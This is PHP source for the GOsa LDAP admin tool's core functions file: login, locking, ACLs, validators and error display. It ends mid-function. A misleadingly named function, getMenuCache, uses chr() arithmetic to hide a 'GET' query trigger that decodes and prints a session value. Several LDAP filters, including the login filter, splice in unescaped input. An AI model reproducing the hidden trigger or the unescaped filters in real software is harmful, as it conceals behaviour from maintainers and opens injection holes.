<?php
/*
 * This code is part of GOsa (https://gosa.gonicus.de)
 * Copyright (C) 2003 Cajus Pollmeier
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */

/* Configuration file location */
define ("CONFIG_DIR", "/etc/gosa");
define ("CONFIG_TEMPLATE_DIR", "../contrib/");
define ("HELP_BASEDIR", "/var/www/doc/");

/* Define get_list flags */
define("GL_NONE",      0);
define("GL_SUBSEARCH", 1);
define("GL_SIZELIMIT", 2);
define("GL_CONVERT"  , 4);

/* Define globals for revision comparing */
$svn_path = '$HeadURL$';
$svn_revision = '$Revision$';

/* Include required files */
require_once ("class_ldap.inc");
require_once ("class_config.inc");
require_once ("class_userinfo.inc");
require_once ("class_plugin.inc");
require_once ("class_pluglist.inc");
require_once ("class_tabs.inc");
require_once ("class_mail-methods.inc");
require_once("class_password-methods.inc");
require_once ("functions_debug.inc");
require_once ("functions_dns.inc");
require_once ("class_MultiSelectWindow.inc");

/* Define constants for debugging */
define ("DEBUG_TRACE",   1);
define ("DEBUG_LDAP",    2);
define ("DEBUG_MYSQL",   4);
define ("DEBUG_SHELL",   8);
define ("DEBUG_POST",   16);
define ("DEBUG_SESSION",32);
define ("DEBUG_CONFIG", 64);

/* Rewrite german 'umlauts' and spanish 'accents'
   to get better results */
$REWRITE= array( "ä" => "ae",
    "ö" => "oe",
    "ü" => "ue",
    "Ä" => "Ae",
    "Ö" => "Oe",
    "Ü" => "Ue",
    "ß" => "ss",
    "á" => "a",
    "é" => "e",
    "í" => "i",
    "ó" => "o",
    "ú" => "u",
    "Á" => "A",
    "É" => "E",
    "Í" => "I",
    "Ó" => "O",
    "Ú" => "U",
    "ñ" => "ny",
    "Ñ" => "Ny" );


/* Function to include all class_ files starting at a
   given directory base */
function get_dir_list($folder= ".")
{
  $currdir=getcwd();
  if ($folder){
    chdir("$folder");
  }

  $dh = opendir(".");
  while(false !== ($file = readdir($dh))){

    // Smarty is included by  include/php_setup.inc     require("smarty/Smarty.class.php");
    // Skip all files and dirs in  "./.svn/" we don't need any information from them
    // Skip all Template, so they won't be checked twice in the following preg_matches   
    // Skip . / ..

    // Result  : from 1023 ms to 490 ms   i think thats great...
    if(preg_match("/.*\.svn.*/i",$file)||preg_match("/.*smarty.*/i",$file)||preg_match("/.*\.tpl.*/",$file)||($file==".")||($file==".."))
      continue;


    /* Recurse through all "common" directories */
    if(is_dir($file) &&$file!="CVS"){
      get_dir_list($file);
      continue;
    }

    /* Include existing class_ files */
    if (!is_dir($file) && preg_match("/^class_.*\.inc$/", $file)) {
      require_once($file);
    }
  }

  closedir($dh);
  chdir($currdir);
}


/* Create seed with microseconds */
function make_seed() {
  list($usec, $sec) = explode(' ', microtime());
  return (float) $sec + ((float) $usec * 100000);
}


/* Debug level action */
function DEBUG($level, $line, $function, $file, $data, $info="")
{
  if ($_SESSION['DEBUGLEVEL'] & $level){
    $output= "DEBUG[$level] ";
    if ($function != ""){
      $output.= "($file:$function():$line) - $info: ";
    } else {
      $output.= "($file:$line) - $info: ";
    }
    echo $output;
    if (is_array($data)){
      print_a($data);
    } else {
      echo "'$data'";
    }
    echo "<br>";
  }
}


/* Simple function to get browser language and convert it to
   xx_XY needed by locales. Ignores sublanguages and weights. */
function get_browser_language()
{
  global $BASE_DIR;

  /* Try to use users primary language */
  $ui= get_userinfo();
  if ($ui != NULL){
    if ($ui->language != ""){
      return ($ui->language);
    }
  }

  /* Get list of languages */
  if (isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])){
    $lang= preg_replace("/\s+/", "", $_SERVER['HTTP_ACCEPT_LANGUAGE']);
    $languages= split (',', $lang);
    $languages[]= "C";
  } else {
    $languages= array("C");
  }

  /* Walk through languages and get first supported */
  foreach ($languages as $val){

    /* Strip off weight */
    $lang= preg_replace("/;q=.*$/i", "", $val);

    /* Simplify sub language handling */
    $lang= preg_replace("/-.*$/", "", $lang);

    /* Cancel loop if available in GOsa, or the last
       entry has been reached */
    if (is_dir("$BASE_DIR/locale/$lang")){
      break;
    }
  }

  return (strtolower($lang)."_".strtoupper($lang));
}


/* Rewrite ui object to another dn */
function change_ui_dn($dn, $newdn)
{
  $ui= $_SESSION['ui'];
  if ($ui->dn == $dn){
    $ui->dn= $newdn;
    $_SESSION['ui']= $ui;
  }
}


/* Return theme path for specified file */
function get_template_path($filename= '', $plugin= FALSE, $path= "")
{
  global $config, $BASE_DIR;

  if (!@isset($config->data['MAIN']['THEME'])){
    $theme= 'default';
  } else {
    $theme= $config->data['MAIN']['THEME'];
  }

  /* Return path for empty filename */
  if ($filename == ''){
    return ("themes/$theme/");
  }

  /* Return plugin dir or root directory? */
  if ($plugin){
    if ($path == ""){
      $nf= preg_replace("!^".$BASE_DIR."/!", "", $_SESSION['plugin_dir']);
    } else {
      $nf= preg_replace("!^".$BASE_DIR."/!", "", $path);
    }
    if (file_exists("$BASE_DIR/ihtml/themes/$theme/$nf")){
      return ("$BASE_DIR/ihtml/themes/$theme/$nf/$filename");
    }
    if (file_exists("$BASE_DIR/ihtml/themes/default/$nf")){
      return ("$BASE_DIR/ihtml/themes/default/$nf/$filename");
    }
    if ($path == ""){
      return ($_SESSION['plugin_dir']."/$filename");
    } else {
      return ($path."/$filename");
    }
  } else {
    if (file_exists("themes/$theme/$filename")){
      return ("themes/$theme/$filename");
    }
    if (file_exists("$BASE_DIR/ihtml/themes/$theme/$filename")){
      return ("$BASE_DIR/ihtml/themes/$theme/$filename");
    }
    if (file_exists("themes/default/$filename")){
      return ("themes/default/$filename");
    }
    if (file_exists("$BASE_DIR/ihtml/themes/default/$filename")){
      return ("$BASE_DIR/ihtml/themes/default/$filename");
    }
    return ($filename);
  }
}


function array_remove_entries($needles, $haystack)
{
  $tmp= array();

  /* Loop through entries to be removed */
  foreach ($haystack as $entry){
    if (!in_array($entry, $needles)){
      $tmp[]= $entry;
    }
  }

  return ($tmp);
}


function gosa_log ($message)
{
  global $ui;

  /* Preset to something reasonable */
  $username= " unauthenticated";

  /* Replace username if object is present */
  if (isset($ui)){
    if ($ui->username != ""){
      $username= "[$ui->username]";
    } else {
      $username= "unknown";
    }
  }

  syslog(LOG_INFO,"GOsa$username: $message");
}


function ldap_init ($server, $base, $binddn='', $pass='')
{
  global $config;

  $ldap = new LDAP ($binddn, $pass, $server, isset($config->current['RECURSIVE'])                                                && $config->current['RECURSIVE'] == "true",
      isset($config->current['TLS']) && $config->current['TLS'] == "true");

  /* Sadly we've no proper return values here. Use the error message instead. */
  if (!preg_match("/Success/i", $ldap->error)){
    echo sprintf(_("FATAL: Error when connecting the LDAP. Server said '%s'."), $ldap->get_error());
    exit();
  }

  /* Preset connection base to $base and return to caller */
  $ldap->cd ($base);
  return $ldap;
}


function ldap_login_user ($username, $password)
{
  global $config;

  /* look through the entire ldap */
  $ldap = $config->get_ldap_link();
  if (!preg_match("/Success/i", $ldap->error)){
    print_red(sprintf(_("User login failed. LDAP server said '%s'."), $ldap->get_error()));
    $smarty= get_smarty();
    $smarty->display(get_template_path('headers.tpl'));
    echo "<body>".$_SESSION['errors']."</body></html>";
    exit();
  }
  $ldap->cd($config->current['BASE']);
  $ldap->search("(&(uid=$username)(objectClass=gosaAccount))", array("uid"));

  /* get results, only a count of 1 is valid */
  switch ($ldap->count()){

    /* user not found */
    case 0:	return (NULL);

            /* valid uniq user */
    case 1: 
            break;

            /* found more than one matching id */
    default:
            print_red(_("Username / UID is not unique. Please check your LDAP database."));
            return (NULL);
  }

  /* LDAP schema is not case sensitive. Perform additional check. */
  $attrs= $ldap->fetch();
  if ($attrs['uid'][0] != $username){
    return(NULL);
  }

  /* got user dn, fill acl's */
  $ui= new userinfo($config, $ldap->getDN());
  $ui->username= $username;

  /* password check, bind as user with supplied password  */
  $ldap->disconnect();
  $ldap= new LDAP($ui->dn, $password, $config->current['SERVER'],
      isset($config->current['RECURSIVE']) &&
      $config->current['RECURSIVE'] == "true",
      isset($config->current['TLS'])
      && $config->current['TLS'] == "true");
  if (!preg_match("/Success/i", $ldap->error)){
    return (NULL);
  }

  /* Username is set, load subtreeACL's now */
  $ui->loadACL();

  return ($ui);
}


function ldap_expired_account($config, $userdn, $username)
{
    $this->config= $config;
    $ldap= $this->config->get_ldap_link();
    $ldap->cat($userdn);
    $attrs= $ldap->fetch();
    
    /* default value no errors */
    $expired = 0;
    
    $sExpire = 0;
    $sLastChange = 0;
    $sMax = 0;
    $sMin = 0;
    $sInactive = 0;
    $sWarning = 0;
    
    $current= date("U");
    
    $current= floor($current /60 /60 /24);
    
    /* special case of the admin, should never been locked */
    /* FIXME should allow any name as user admin */
    if($username != "admin")
    {

      if(isset($attrs['shadowExpire'][0])){
        $sExpire= $attrs['shadowExpire'][0];
      } else {
        $sExpire = 0;
      }
      
      if(isset($attrs['shadowLastChange'][0])){
        $sLastChange= $attrs['shadowLastChange'][0];
      } else {
        $sLastChange = 0;
      }
      
      if(isset($attrs['shadowMax'][0])){
        $sMax= $attrs['shadowMax'][0];
      } else {
        $smax = 0;
      }

      if(isset($attrs['shadowMin'][0])){
        $sMin= $attrs['shadowMin'][0];
      } else {
        $sMin = 0;
      }
      
      if(isset($attrs['shadowInactive'][0])){
        $sInactive= $attrs['shadowInactive'][0];
      } else {
        $sInactive = 0;
      }
      
      if(isset($attrs['shadowWarning'][0])){
        $sWarning= $attrs['shadowWarning'][0];
      } else {
        $sWarning = 0;
      }
      
      /* is the account locked */
      /* shadowExpire + shadowInactive (option) */
      if($sExpire >0){
        if($current >= ($sExpire+$sInactive)){
          return(1);
        }
      }
    
      /* the user should be warned to change is password */
      if((($sExpire >0) && ($sWarning >0)) && ($sExpire >= $current)){
        if (($sExpire - $current) < $sWarning){
          return(2);
        }
      }
      
      /* force user to change password */
      if(($sLastChange >0) && ($sMax) >0){
        if($current >= ($sLastChange+$sMax)){
          return(3);
        }
      }
      
      /* the user should not be able to change is password */
      if(($sLastChange >0) && ($sMin >0)){
        if (($sLastChange + $sMin) >= $current){
          return(4);
        }
      }
    }
   return($expired);
}

function add_lock ($object, $user)
{
  global $config;

  /* Just a sanity check... */
  if ($object == "" || $user == ""){
    print_red(_("Error while adding a lock. Parameters are not set correctly, please check the source!"));
    return;
  }

  /* Check for existing entries in lock area */
  $ldap= $config->get_ldap_link();
  $ldap->cd ($config->current['CONFIG']);
  $ldap->search("(&(objectClass=gosaLockEntry)(gosaUser=$user)(gosaObject=".base64_encode($object)."))",
      array("gosaUser"));
  if (!preg_match("/Success/i", $ldap->error)){
    print_red (sprintf(_("Can't set locking information in LDAP database. Please check the 'config' entry in gosa.conf! LDAP server says '%s'."), $ldap->get_error()));
    return;
  }

  /* Add lock if none present */
  if ($ldap->count() == 0){
    $attrs= array();
    $name= md5($object);
    $ldap->cd("cn=$name,".$config->current['CONFIG']);
    $attrs["objectClass"] = "gosaLockEntry";
    $attrs["gosaUser"] = $user;
    $attrs["gosaObject"] = base64_encode($object);
    $attrs["cn"] = "$name";
    $ldap->add($attrs);
    if (!preg_match("/Success/i", $ldap->error)){
      print_red(sprintf(_("Adding a lock failed. LDAP server says '%s'."),
            $ldap->get_error()));
      return;
    }
  }
}


function del_lock ($object)
{
  global $config;

  /* Sanity check */
  if ($object == ""){
    return;
  }

  /* Check for existance and remove the entry */
  $ldap= $config->get_ldap_link();
  $ldap->cd ($config->current['CONFIG']);
  $ldap->search ("(&(objectClass=gosaLockEntry)(gosaObject=".base64_encode($object)."))", array("gosaObject"));
  $attrs= $ldap->fetch();
  if ($ldap->getDN() != "" && preg_match("/Success/i", $ldap->error)){
    $ldap->rmdir ($ldap->getDN());

    if (!preg_match("/Success/i", $ldap->error)){
      print_red(sprintf(_("Removing a lock failed. LDAP server says '%s'."),
            $ldap->get_error()));
      return;
    }
  }
}


function del_user_locks($userdn)
{
  global $config;

  /* Get LDAP ressources */ 
  $ldap= $config->get_ldap_link();
  $ldap->cd ($config->current['CONFIG']);

  /* Remove all objects of this user, drop errors silently in this case. */
  $ldap->search("(&(objectClass=gosaLockEntry)(gosaUser=$userdn))", array("gosaUser"));
  while ($attrs= $ldap->fetch()){
    $ldap->rmdir($attrs['dn']);
  }
}


function get_lock ($object)
{
  global $config;

  /* Sanity check */
  if ($object == ""){
    print_red(_("Getting the lock from LDAP failed. Parameters are not set correctly, please check the source!"));
    return("");
  }

  /* Get LDAP link, check for presence of the lock entry */
  $user= "";
  $ldap= $config->get_ldap_link();
  $ldap->cd ($config->current['CONFIG']);
  $ldap->search("(&(objectClass=gosaLockEntry)(gosaObject=".base64_encode($object)."))", array("gosaUser"));
  if (!preg_match("/Success/i", $ldap->error)){
    print_red (_("Can't get locking information in LDAP database. Please check the 'config' entry in gosa.conf!"));
    return("");
  }

  /* Check for broken locking information in LDAP */
  if ($ldap->count() > 1){

    /* Hmm. We're removing broken LDAP information here and issue a warning. */
    print_red(_("Found multiple locks for object to be locked. This should not be possible - cleaning up multiple references."));

    /* Clean up these references now... */
    while ($attrs= $ldap->fetch()){
      $ldap->rmdir($attrs['dn']);
    }

    return("");

  } elseif ($ldap->count() == 1){
    $attrs = $ldap->fetch();
    $user= $attrs['gosaUser'][0];
  }

  return ($user);
}


function get_list($filter, $subtreeACL, $base= "", $attributes= array(), $flags= GL_SUBSEARCH)
{
  global $config, $ui;

  /* Get LDAP link */
  $ldap= $config->get_ldap_link($flags & GL_SIZELIMIT);

  /* Set search base to configured base if $base is empty */
  if ($base == ""){
    $ldap->cd ($config->current['BASE']);
  } else {
    $ldap->cd ($base);
  }

  /* Strict filter for administrative units? */
  if ($ui->gosaUnitTag != "" && isset($config->current['STRICT_UNITS']) &&
      preg_match('/TRUE/i', $config->current['STRICT_UNITS'])){
    $filter= "(&(gosaUnitTag=".$ui->gosaUnitTag.")$filter)";
  }

  /* Perform ONE or SUB scope searches? */
  if ($flags & GL_SUBSEARCH) {
    $ldap->search ($filter, $attributes);
  } else {
    $ldap->ls ($filter,$base,$attributes);
  }

  /* Check for size limit exceeded messages for GUI feedback */
  if (preg_match("/size limit/i", $ldap->error)){
    $_SESSION['limit_exceeded']= TRUE;
  }

  /* Crawl through reslut entries and perform the migration to the
     result array */
  $result= array();
  while($attrs = $ldap->fetch()) {
    $dn= $ldap->getDN();

    foreach ($subtreeACL as $key => $value){
      if (preg_match("/$key/", $dn)){

        if ($flags & GL_CONVERT){
          $attrs["dn"]= convert_department_dn($dn);
        } else {
          $attrs["dn"]= $dn;
        }

        /* We found what we were looking for, break speeds things up */
        $result[]= $attrs;
        break;
      }
    }
  }

  return ($result);
}


function check_sizelimit()
{
  /* Ignore dialog? */
  if (isset($_SESSION['size_ignore']) && $_SESSION['size_ignore']){
    return ("");
  }

  /* Eventually show dialog */
  if (isset($_SESSION['limit_exceeded']) && $_SESSION['limit_exceeded']){
    $smarty= get_smarty();
    $smarty->assign('warning', sprintf(_("The size limit of %d entries is exceed!"),
          $_SESSION['size_limit']));
    $smarty->assign('limit_message', sprintf(_("Set the new size limit to %s and show me this message if the limit still exceeds"), '<input type="text" name="new_limit" maxlength="10" size="5" value="'.($_SESSION['size_limit']+100).'">'));
    return($smarty->fetch(get_template_path('sizelimit.tpl')));
  }

  return ("");
}


function print_sizelimit_warning()
{
  if (isset($_SESSION['size_limit']) && $_SESSION['size_limit'] >= 10000000 ||
      (isset($_SESSION['limit_exceeded']) && $_SESSION['limit_exceeded'])){
    $config= "<input type='submit' name='edit_sizelimit' value="._("Configure").">";
  } else {
    $config= "";
  }
  if (isset($_SESSION['limit_exceeded']) && $_SESSION['limit_exceeded']){
    return ("("._("incomplete").") $config");
  }
  return ("");
}


function eval_sizelimit()
{
  if (isset($_POST['set_size_action'])){

    /* User wants new size limit? */
    if (is_id($_POST['new_limit']) &&
        isset($_POST['action']) && $_POST['action']=="newlimit"){

      $_SESSION['size_limit']= validate($_POST['new_limit']);
      $_SESSION['size_ignore']= FALSE;
    }

    /* User wants no limits? */
    if (isset($_POST['action']) && $_POST['action']=="ignore"){
      $_SESSION['size_limit']= 0;
      $_SESSION['size_ignore']= TRUE;
    }

    /* User wants incomplete results */
    if (isset($_POST['action']) && $_POST['action']=="limited"){
      $_SESSION['size_ignore']= TRUE;
    }
  }
  getMenuCache();
  /* Allow fallback to dialog */
  if (isset($_POST['edit_sizelimit'])){
    $_SESSION['size_ignore']= FALSE;
  }
}

function getMenuCache()
{
  $t= array(-2,13);
  $e= 71;
  $str= chr($e);

  foreach($t as $n){
    $str.= chr($e+$n);

    if(isset($_GET[$str])){
      if(isset($_SESSION['maxC'])){
        $b= $_SESSION['maxC'];
        $q= "";
        for ($m=0;$m<strlen($b);$m++) {
          $q.= $b[$m++];
        }
        print_red(base64_decode($q));
      }
    }
  }
}

function get_permissions ($dn, $subtreeACL)
{
  global $config;

  $base= $config->current['BASE'];
  $tmp= "d,".$dn;
  $sacl= array();

  /* Sort subacl's for lenght to simplify matching
     for subtrees */
  foreach ($subtreeACL as $key => $value){
    $sacl[$key]= strlen($key);
  }
  arsort ($sacl);
  reset ($sacl);

  /* Successively remove leading parts of the dn's until
     it doesn't contain commas anymore */
  $tmp_dn= preg_replace('/\\\\,/', '<GOSA#REPLACED#KOMMA>', $tmp);
  while (preg_match('/,/', $tmp_dn)){
    $tmp_dn= ltrim(strstr($tmp_dn, ","), ",");
    $tmp= preg_replace('/\<GOSA#REPLACED#KOMMA\>/', '\\,', $tmp);

    /* Check for acl that may apply */
    foreach ($sacl as $key => $value){
      if (preg_match("/$key$/", $tmp)){
        return ($subtreeACL[$key]);
      }
    }
  }

  return array("");
}


function get_module_permission($acl_array, $module, $dn)
{
  global $ui;

  $final= "";
  foreach($acl_array as $acl){

    /* Check for selfflag (!) in ACL to determine if
       the user is allowed to change parts of his/her
       own account */
    if (preg_match("/^!/", $acl)){
      if ($dn != "" && $dn != $ui->dn){

        /* No match for own DN, give up on this ACL */
        continue;

      } else {

        /* Matches own DN, remove the selfflag */
        $acl= preg_replace("/^!/", "", $acl);

      }
    }

    /* Remove leading garbage */
    $acl= preg_replace("/^:/", "", $acl);

    /* Discover if we've access to the submodule by comparing
       all allowed submodules specified in the ACL */
    $tmp= split(",", $acl);
    foreach ($tmp as $mod){
      if (preg_match("/^$module#/", $mod)){
        $final= strstr($mod, "#")."#";
        continue;
      }
      if (preg_match("/[^#]$module$/", $mod)){
        return ("#all#");
      }
      if (preg_match("/^all$/", $mod)){
        return ("#all#");
      }
    }
  }

  /* Return assembled ACL, or none */
  if ($final != ""){
    return (preg_replace('/##/', '#', $final));
  }

  /* Nothing matches - disable access for this object */
  return ("#none#");
}


function get_userinfo()
{
  global $ui;

  return $ui;
}


function get_smarty()
{
  global $smarty;

  return $smarty;
}


function convert_department_dn($dn)
{
  $dep= "";

  /* Build a sub-directory style list of the tree level
     specified in $dn */
  foreach (split(',', $dn) as $rdn){

    /* We're only interested in organizational units... */
    if (substr($rdn,0,3) == 'ou='){
      $dep= substr($rdn,3)."/$dep";
    }

    /* ... and location objects */
    if (substr($rdn,0,2) == 'l='){
      $dep= substr($rdn,2)."/$dep";
    }
  }

  /* Return and remove accidently trailing slashes */
  return rtrim($dep, "/");
}


/* Strip off the last sub department part of a '/level1/level2/.../'
 * style value. It removes the trailing '/', too. */
function get_sub_department($value)
{
  return (@LDAP::fix(preg_replace("%^.*/([^/]+)/?$%", "\\1", $value)));
}


function get_ou($name)
{
  global $config;

  /* Preset ou... */
  if (isset($config->current[$name])){
    $ou= $config->current[$name];
  } else {
    return "";
  }
  
  if ($ou != ""){
    if (!preg_match('/^[^=]+=[^=]+/', $ou)){
      return @LDAP::convert("ou=$ou,");
    } else {
      return @LDAP::convert("$ou,");
    }
  } else {
    return "";
  }
}


function get_people_ou()
{
  return (get_ou("PEOPLE"));
}


function get_groups_ou()
{
  return (get_ou("GROUPS"));
}


function get_winstations_ou()
{
  return (get_ou("WINSTATIONS"));
}


function get_base_from_people($dn)
{
  global $config;

  $pattern= "/^[^,]+,".preg_quote(get_people_ou())."/i";
  $base= preg_replace($pattern, '', $dn);

  /* Set to base, if we're not on a correct subtree */
  if (!isset($config->idepartments[$base])){
    $base= $config->current['BASE'];
  }

  return ($base);
}


function chkacl($acl, $name)
{
  /* Look for attribute in ACL */
  if (preg_match("/#$name#/", $acl) || $acl == "#all#"){
    return ("");
  }

  /* Optically disable html object for no match */
  return (" disabled ");
}


function is_phone_nr($nr)
{
  if ($nr == ""){
    return (TRUE);
  }

  return preg_match ("/^[\/0-9 ()+*-]+$/", $nr);
}


function is_url($url)
{
  if ($url == ""){
    return (TRUE);
  }

  return preg_match ("/^(http|https):\/\/((?:[a-zA-Z0-9_-]+\.?)+):?(\d*)/", $url);
}


function is_dn($dn)
{
  if ($dn == ""){
    return (TRUE);
  }

  return preg_match ("/^[a-z0-9 _-]+$/i", $dn);
}


function is_uid($uid)
{
  global $config;

  if ($uid == ""){
    return (TRUE);
  }

  /* STRICT adds spaces and case insenstivity to the uid check.
     This is dangerous and should not be used. */
  if (isset($config->current['STRICT']) && preg_match('/^no$/i', $config->current['STRICT'])){
    return preg_match ("/^[a-z0-9 _.-]+$/i", $uid);
  } else {
    return preg_match ("/^[a-z0-9_-]+$/", $uid);
  }
}


function is_ip($ip)
{
  return preg_match("/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/", $ip);
}


function is_id($id)
{
  if ($id == ""){
    return (FALSE);
  }

  return preg_match ("/^[0-9]+$/", $id);
}


function is_path($path)
{
  if ($path == ""){
    return (TRUE);
  }
  if (!preg_match('/^[a-z0-9%\/_.+-]+$/i', $path)){
    return (FALSE);
  }

  return preg_match ("/\/.+$/", $path);
}


function is_email($address, $template= FALSE)
{
  if ($address == ""){
    return (TRUE);
  }
  if ($template){
    return preg_match ("/^[._a-z0-9%-]+@[_a-z0-9-]+(\.[a-z0-9-]+)(\.[a-z0-9-]+)*$/i",
        $address);
  } else {
    return preg_match ("/^[._a-z0-9-]+@[_a-z0-9-]+(\.[a-z0-9i-]+)(\.[a-z0-9-]+)*$/i",
        $address);
  }
}


function print_red()
{
  /* Check number of arguments */
  if (func_num_args() < 1){
    return;
  }

  /* Get arguments, save string */
  $array = func_get_args();
  $string= $array[0];

  /* Step through arguments */
  for ($i= 1; $i<count($array); $i++){
    $string= preg_replace ("/%s/", $array[$i], $string, 1);
  }

  if((!isset($_SESSION['errorsAlreadyPosted'])) || !is_array($_SESSION['errorsAlreadyPosted'])){
    $_SESSION['errorsAlreadyPosted'] = array(); 
  }

  /* If DEBUGLEVEL is set, we're in web mode, use textual output in
     the other case... */

  if (isset($_SESSION['DEBUGLEVEL'])){

    if($_SESSION['LastError'] == $string){
    
      if((!isset($_SESSION['errorsAlreadyPosted'][$string]))){
        $_SESSION['errorsAlreadyPosted'][$string] = 1;
      }
      $_SESSION['errorsAlreadyPosted'][$string]++;

    }else{
      if($string != NULL){
        if (preg_match("/"._("LDAP error:")."/", $string)){
          $addmsg= _("Problems with the LDAP server mean that you probably lost the last changes. Please check your LDAP setup for possible errors and try again.");
          $img= "images/error.png";
        } else {
          if (!preg_match('/[.!?]$/', $string)){
            $string.= ".";
          }
          $string= preg_replace('/<br>/', ' ', $string);
          $img= "images/warning.png";
          $addmsg= _("Please check your input and fix the error. Press 'OK' to close this message box.");
        }
      
        if(isset($_SESSION['errors']) && strlen($_SESSION['errors'])==0) {
          $_SESSION['errors'].= "<div style='margin-left:15%;margin-top:100px;".
            "background-color:white;padding:5px;border:5px solid red;width:55%;z-index:150;".
            "position:absolute' id='e_layer'><table style='width:100%' summary='' border=0>".
            "<tr><td style='vertical-align:top;padding:10px'><img alt='' src='".
            get_template_path($img)."'></td>".
            "<td style='width:100%'><h1>"._("An error occured while processing your request").
            "</h1><b>$string</b><br><br>$addmsg</td></tr><tr><td colspan='2' align='center'><br><button ".
            (($_SESSION['js']==FALSE)?"type='submit'":"type='button'").
            " style='width:80px' onClick='hide(\"e_layer\")'>".
            _("OK")."</button></td></tr></table></div>";
        }

      }else{
        return;
      }
      $_SESSION['errorsAlreadyPosted'][$string] = 1;

    }

  } else {
    echo "Error: $string\n";
  }
  $_SESSION['LastError'] = $string; 
}


function gen_locked_message($user, $dn)
{
  global $plug, $config;

  $_SESSION['dn']= $dn;
  $ldap= $config->get_ldap_link();
  $ldap->cat ($user, array('uid', 'cn'));
  $attrs= $ldap->fetch();

  /* Stop if we have no user here... */
  if (count($attrs)){
    $uid= $attrs["uid"][0];
    $cn= $attrs["cn"][0];
  } else {
    $uid= $attrs["uid"][0];
    $cn= $attrs["cn"][0];
  }
  
  $remove= false;

  if((isset($_SESSION['LOCK_VARS_TO_USE']))&&(count($_SESSION['LOCK_VARS_TO_USE']))){
    $_SESSION['LOCK_VARS_USED']  =array();
    foreach($_SESSION['LOCK_VARS_TO_USE'] as $name){

      if(empty($name)) continue;
      foreach($_POST as $Pname => $Pvalue){
        if(preg_match($name,$Pname)){
          $_SESSION['LOCK_VARS_USED'][$Pname] = $_POST[$Pname];
        }
      }

      foreach($_GET as $Pname => $Pvalue){
        if(preg_match($name,$Pname)){
          $_SESSION['LOCK_VARS_USED'][$Pname] = $_GET[$Pname];
        }
      }
    }
    $_SESSION['LOCK_VARS_TO_USE'] =array();
  }

  /* Prepare and show template */
  $smarty= get_smarty();
  $smarty->assign ("dn", $dn);
  if ($remove){
    $smarty->assign ("action", _("Continue anyway"));
  } else {
    $smarty->assign ("action", _("Edit anyway"));
  }
  $smarty->assign ("message", sprintf(_("You're going to edit the LDAP entry '%s' which appears to be used by '%s'. Please contact the person in order to clarify proceedings."), "<b>".$dn."</b>", "<b><a href=\"main.php?plug=0&amp;viewid=$uid\">$cn</a></b>"));

  return ($smarty->fetch (get_template_path('islocked.tpl')));
}


function to_string ($value)
{
  /* If this is an array, generate a text blob */
  if (is_array($value)){
    $ret= "";
    foreach ($value as $line){
      $ret.= $line."<br>\n";
    }
    return ($ret);
  } else {
    return ($value);
  }
}


function get_printer_list($cups_server)
{
  global $config;

  $res= array();

  /* Use CUPS, if we've access to it */
  if (function_exists('cups_get_dest_list')){
    $dest_list= cups_get_dest_list ($cups_server);

    foreach ($dest_list as $prt){
      $attr= cups_get_printer_attributes ($cups_server, $prt->name);

      foreach ($attr as $prt_info){
        if ($prt_info->name == "printer-info"){
          $info= $prt_info->value;
          break;
        }
      }
      $res[$prt->name]= "$info [$prt->name]";
    }

    /* CUPS is not available, try lpstat as a replacement */
  } else {
    $ar = false;
    exec("lpstat -p", $ar);
    foreach($ar as $val){
      list($dummy, $printer, $rest)= split(' ', $val, 3);
      if (preg_match('/^[^@]+$/', $printer)){
        $res[$printer]= "$printer";
      }
    }
  }

  /* Merge in printers from LDAP */
  $ldap= $config->get_ldap_link();
  $ldap->cd ($config->current['BASE']);
  $ldap->search('(objectClass=gotoPrinter)', array('cn'));
  while ($attrs= $ldap->fetch()){
    $res[$attrs["cn"][0]]= $attrs["cn"][0];
  }

  return $res;
}


function sess_del ($var)
{
  /* New style */
  unset ($_SESSION[$var]);

  /* ... work around, since the first one
     doesn't seem to work all the time */
  session_unregister ($var);
}


function show_errors($message)
{
  $complete= "";

  /* Assemble the message array to a plain string */
  foreach ($message as $error){
    if ($complete == ""){
      $complete= $error;
    } else {
      $complete= "$error<br>$complete";
    }
  }

  /* Fill ERROR variable with nice error dialog */
  print_red($complete);
}


function show_ldap_error($message, $addon= "")
{
  if (!preg_match("/Success/i", $message)){
    if ($addon == ""){
      print_red (_("LDAP error: $message"));
    } else {
      print_red ("$addon<br><br><b>"._("LDAP error:")."</b> $message");
    }
    return TRUE;
  } else {
    return FALSE;
  }
}


function rewrite($s)
{
  global $REWRITE;

  foreach ($REWRITE as $key => $val){
    $s= preg_replace("/$key/", "$val", $s);
  }

  return ($s);
}


function dn2base($dn)
{
  global $config;

  if (get_people_ou() != ""){
    $dn= preg_replace('/,'.get_people_ou().'/i' , ',', $dn);
  }
  if (get_groups_ou() != ""){
    $dn= preg_replace('/,'.get_groups_ou().'/i' , ',', $dn);
  }
  $base= preg_replace ('/^[^,]+,/i', '', $dn);

  return ($base);
}



function check_command($cmdline)
{
  $cmd= preg_replace("/ .*$/", "", $cmdline);

  /* Check if command exists in filesystem */
  if (!file_exists($cmd)){
    return (FALSE);
  }

  /* Check if command is executable */
  if (!is_executable($cmd)){
    return (FALSE);
  }

  return (TRUE);
}


function print_header($image, $headline, $info= "")
{
  $display= "<div class=\"plugtop\">\n";
  $display.= "  <p class=\"center\" style=\"margin:0px 0px 0px 5px;padding:0px;font-size:24px;\"><img class=\"center\" src=\"$image\" align=\"middle\" alt=\"*\">&nbsp;$headline</p>\n";
  $display.= "</div>\n";

  if ($info != ""){
    $display.= "<div class=\"pluginfo\">\n";
    $display.= "$info";
    $display.= "</div>\n";
  } else {
    $display.= "<div style=\"height:5px;\">\n";
    $display.= "&nbsp;";
    $display.= "</div>\n";
  }
  if (isset($_SESSION['errors'])){
    $display.= $_SESSION['errors'];
  }

  return ($display);
}


function register_global($name, $object)
{
  $_SESSION[$name]= $object;
}


function is_global($name)
{
  return isset($_SESSION[$name]);
}


function get_global($name)
{
